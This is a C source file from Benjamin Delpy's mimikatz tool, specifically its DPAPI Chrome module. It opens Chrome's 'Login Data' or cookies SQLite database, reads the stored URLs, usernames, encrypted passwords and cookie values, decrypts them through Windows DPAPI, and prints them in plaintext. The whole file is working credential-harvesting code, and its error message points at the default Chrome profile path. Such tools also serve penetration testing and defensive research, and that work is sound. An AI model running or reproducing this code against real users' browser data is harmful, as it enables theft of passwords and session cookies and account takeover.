/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_dpapi_chrome.h"
#if defined(SQLITE3_OMIT)

NTSTATUS kuhl_m_dpapi_chrome(int argc, wchar_t * argv[])
{
	PCWSTR infile;
	PSTR aInfile;
	int rc;
	sqlite3 *pDb;
	sqlite3_stmt * pStmt;
	LPVOID pDataOut;
	DWORD dwDataOutLen;
	__int64 i64;

	if(kull_m_string_args_byName(argc, argv, L"in", &infile, NULL))
	{
		if(aInfile = kull_m_string_unicode_to_ansi(infile))
		{
			rc = sqlite3_initialize();
			if(rc == SQLITE_OK)
			{
				rc = sqlite3_open_v2(aInfile, &pDb, SQLITE_OPEN_READONLY, "win32-none");
				if(rc == SQLITE_OK)
				{
					if(kuhl_m_dpapi_chrome_isTableExist(pDb, "logins"))
					{
						rc = sqlite3_prepare_v2(pDb, "select signon_realm, origin_url, username_value, password_value from logins", -1, &pStmt, NULL);
						if(rc == SQLITE_OK)
						{
							while(rc = sqlite3_step(pStmt), rc == SQLITE_ROW)
							{
								kprintf(L"\nURL     : %.*S ( %.*S )\nUsername: %.*S\n",
									sqlite3_column_bytes(pStmt, 0), sqlite3_column_text(pStmt, 0),
									sqlite3_column_bytes(pStmt, 1), sqlite3_column_text(pStmt, 1),
									sqlite3_column_bytes(pStmt, 2), sqlite3_column_text(pStmt, 2));
								if(kuhl_m_dpapi_unprotect_raw_or_blob(sqlite3_column_blob(pStmt, 3), sqlite3_column_bytes(pStmt, 3), NULL, argc, argv, NULL, 0, &pDataOut, &dwDataOutLen, NULL))
								{
									kprintf(L"Password: %.*S\n", dwDataOutLen, pDataOut);
									LocalFree(pDataOut);
								}
							}
							if(rc != SQLITE_DONE)
								PRINT_ERROR(L"sqlite3_step: %S\n", sqlite3_errmsg(pDb));
						}
						else PRINT_ERROR(L"sqlite3_prepare_v2: %S\n", sqlite3_errmsg(pDb));
						sqlite3_finalize(pStmt);
					}
					else if(kuhl_m_dpapi_chrome_isTableExist(pDb, "cookies"))
					{
						rc = sqlite3_prepare_v2(pDb, "select host_key, path, name, creation_utc, expires_utc, encrypted_value from cookies order by host_key, path, name", -1, &pStmt, NULL);
						if(rc == SQLITE_OK)
						{
							while(rc = sqlite3_step(pStmt), rc == SQLITE_ROW)
							{
								kprintf(L"\nHost  : %.*S ( %.*S )\nName  : %.*S\nDates : ",
									sqlite3_column_bytes(pStmt, 0), sqlite3_column_text(pStmt, 0),
									sqlite3_column_bytes(pStmt, 1), sqlite3_column_text(pStmt, 1),
									sqlite3_column_bytes(pStmt, 2), sqlite3_column_text(pStmt, 2));

								i64 = sqlite3_column_int64(pStmt, 3) * 10;
								kull_m_string_displayLocalFileTime((LPFILETIME) &i64);
								i64 = sqlite3_column_int64(pStmt, 4) * 10;
								if(i64)
								{
									kprintf(L" -> ");
									kull_m_string_displayLocalFileTime((LPFILETIME) &i64);
								}
								kprintf(L"\n");
								if(kuhl_m_dpapi_unprotect_raw_or_blob(sqlite3_column_blob(pStmt, 5), sqlite3_column_bytes(pStmt, 5), NULL, argc, argv, NULL, 0, &pDataOut, &dwDataOutLen, NULL))
								{
									kprintf(L"Cookie: %.*S\n", dwDataOutLen, pDataOut);
									LocalFree(pDataOut);
								}
							}
							if(rc != SQLITE_DONE)
								PRINT_ERROR(L"sqlite3_step: %S\n", sqlite3_errmsg(pDb));
						}
						else PRINT_ERROR(L"sqlite3_prepare_v2: %S\n", sqlite3_errmsg(pDb));
						sqlite3_finalize(pStmt);
					}
					else PRINT_ERROR(L"Neither the table \'logins\' or the table \'cookies\' exist!\n");
				}
				else PRINT_ERROR(L"sqlite3_open_v2: %S (%S)\n", sqlite3_errmsg(pDb), aInfile);
				rc = sqlite3_close_v2(pDb);
				rc = sqlite3_shutdown();
			}
			else PRINT_ERROR(L"sqlite3_initialize: 0x%08x\n", rc);
			LocalFree(aInfile);
		}
	}
	else PRINT_ERROR(L"Input \'Login Data\' file needed (/in:\"%%localappdata%%\\Google\\Chrome\\User Data\\Default\\Login Data\")\n");
	return STATUS_SUCCESS;
}

BOOL kuhl_m_dpapi_chrome_isTableExist(sqlite3 *pDb, const char *table)
{
	BOOL status = FALSE;
	sqlite3_stmt * pStmt;
	int rc;
	rc = sqlite3_prepare_v2(pDb, "select count(*) from sqlite_master where type=\'table\' and name=?", -1, &pStmt, NULL);
	if(rc == SQLITE_OK)
	{
		rc = sqlite3_bind_text(pStmt, 1, table, -1, SQLITE_STATIC);
		if(rc == SQLITE_OK)
		{
			rc = sqlite3_step(pStmt);
			if(rc == SQLITE_ROW)
				status = sqlite3_column_int(pStmt, 0) > 0;
			else PRINT_ERROR(L"sqlite3_step: %S\n", sqlite3_errmsg(pDb));
		}
		else PRINT_ERROR(L"sqlite3_bind_text: %S\n", sqlite3_errmsg(pDb));
	}
	else PRINT_ERROR(L"sqlite3_prepare_v2: %S\n", sqlite3_errmsg(pDb));
	sqlite3_finalize(pStmt);
	return status;
}
#endif